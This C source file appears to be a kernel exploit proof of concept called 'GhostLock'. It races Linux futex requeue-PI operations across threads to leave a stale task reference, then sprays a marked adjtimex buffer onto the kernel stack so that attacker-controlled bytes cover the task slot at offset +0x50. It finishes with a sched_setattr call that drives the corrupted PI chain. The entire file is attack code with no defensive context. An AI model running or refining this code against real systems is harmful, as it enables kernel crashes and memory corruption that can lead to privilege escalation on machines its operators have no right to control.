/**
 * ghostlock_adjtimex_cfu.c — GhostLock + adjtimex 208B stack CFU
 *
 * task @ stack_top-0x168 = timex buffer + 0x50
 */
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/timex.h>
#include <unistd.h>

static uint32_t f_wait __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain __attribute__((aligned(4096)));
static volatile int ready, owner_ok, requeued, done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2,
                  uint32_t v3) {
  return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
  (void)a;
  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  ready = 1;
  while (!owner_ok)
    usleep(100);

  long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &f_pi_target, 0);
  printf("[waiter] WAIT ret=%ld errno=%d\n", r, errno);

  /* 208B pattern; task at +0x50 */
  unsigned char buf[256];
  memset(buf, 0x41, sizeof(buf));
  /* mark task slot distinctly */
  uint64_t *p = (uint64_t *)(buf + 0x50);
  *p = 0x4141414141414141ULL;
  /* also mark neighbors */
  *(uint64_t *)(buf + 0x48) = 0x4242424242424242ULL;
  *(uint64_t *)(buf + 0x58) = 0x4343434343434343ULL;

  errno = 0;
  r = syscall(SYS_adjtimex, buf);
  printf("[adjtimex] ret=%ld errno=%d %s\n", r, errno,
         r < 0 ? strerror(errno) : "OK");

  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t a, b, c;
    uint32_t d, e;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = 9;
  r = syscall(274, 0, &attr, 0);
  printf("[pi] sched_setattr ret=%ld errno=%d\n", r, errno);

  futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  done = 1;
  return 0;
}

static void *owner(void *a) {
  (void)a;
  futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
  owner_ok = 1;
  while (!requeued)
    usleep(100);
  usleep(5000);
  futex(&f_pi_target, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  while (!done)
    sleep(1);
  return 0;
}

int main(void) {
  printf("ghostlock_adjtimex_cfu — 208B CFU covers task@+0x50\n");
  printf("CRASH => cover\n\n");
  f_wait = f_pi_target = f_pi_chain = 0;
  pthread_t wt, ot;
  pthread_create(&wt, 0, waiter, 0);
  usleep(100000);
  pthread_create(&ot, 0, owner, 0);
  usleep(150000);

  for (int i = 0; i < 200; i++) {
    long r =
        futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    if (r >= 0) {
      printf("[trigger] GhostLock ret=%ld\n", r);
      requeued = 1;
      break;
    }
    usleep(500);
  }
  while (!done)
    sleep(1);
  pthread_join(wt, 0);
  pthread_join(ot, 0);
  printf("\n=== KERNEL SURVIVED ===\n");
  return 0;
}
